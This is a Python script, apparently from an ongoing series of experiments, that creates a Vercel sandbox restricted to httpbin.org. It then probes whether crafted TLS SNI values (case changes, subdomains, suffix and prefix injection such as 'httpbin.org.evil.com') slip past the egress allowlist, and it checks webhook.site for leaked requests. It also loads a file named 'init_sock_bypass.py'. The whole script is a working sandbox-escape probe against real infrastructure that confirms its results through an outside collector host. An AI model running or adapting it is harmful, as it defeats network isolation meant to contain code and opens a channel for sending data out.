# 实验J90: SNI 白名单匹配规则审计 — 大小写/子域/后缀注入 + webhook.site 回显
import json, time, urllib.request, urllib.error, sys, base64, ssl, socket
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"
WH = "9c7f5951-b5cd-4b74-afeb-f62d92e457db"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj90"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

TOOL_B64 = base64.b64encode(open("init_sock_bypass.py", "rb").read()).decode()

PROBE = r"""
import importlib.util, base64, subprocess, socket, ssl, json

CASES = [
    ("httpbin.org", "/get", "baseline"),
    ("HTTPBIN.ORG", "/get", "uppercase"),
    ("a.httpbin.org", "/get", "subdomain"),
    ("x.httpbin.org.", "/get", "trailing-dot"),
    ("__WH__", "/", "non-allowlisted-ctrl"),
    ("httpbin.org.__WH__", "/", "suffix-inject"),
    ("httpbin.org.evil.com", "/", "suffix-inject-dead"),
    ("evilhttpbin.org", "/", "prefix-inject"),
]

def tls_get(ip, port, sni, path="/", timeout=8):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        t = ctx.wrap_socket(s, server_hostname=sni)
        req = f"GET {path} HTTP/1.0\r\nHost: {sni}\r\nConnection: close\r\n\r\n"
        t.sendall(req.encode())
        data = b""
        try:
            while True:
                chunk = t.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 2000:
                    break
        except socket.timeout:
            pass
        t.close()
        head = data[:200]
        return f"TLS-OK({t.version()}) len={len(data)} {head!r}"
    except socket.timeout:
        return "TIMEOUT"
    except ConnectionResetError:
        return "RST"
    except ssl.SSLError as e:
        return f"SSL_ERR({e})"
    except OSError as e:
        return f"ERR({e.errno})"

print("== SNI 匹配规则矩阵 (shell) ==", flush=True)
for sni, path, label in CASES:
    res = tls_get("34.230.248.113", 443, sni, path)
    print(f"  [{label:20s}] SNI={sni:55s} -> {res}", flush=True)
"""
run_cmd(sid, PROBE.replace("__WH__", WH), "sni-matrix", wait=True, timeout=300000)
print("\n--- webhook.site 最新请求 ---", flush=True)
try:
    c2, r2 = api("GET", f"https://webhook.site/token/{WH}/requests?sorting=newest", timeout=30)
except Exception:
    pass
# 用 urllib 直接查 webhook
try:
    req = urllib.request.Request(f"https://webhook.site/token/{WH}/requests?sorting=newest")
    with urllib.request.urlopen(req, timeout=15) as rr:
        data = rr.read().decode()
    arr = json.loads(data).get("data", [])
    for item in arr[:5]:
        print(f"  [{item.get('method')}] {item.get('uuid')} host={item.get('hostname')} path={item.get('url','')[:80]}", flush=True)
except Exception as e:
    print("  wh query err:", e, flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
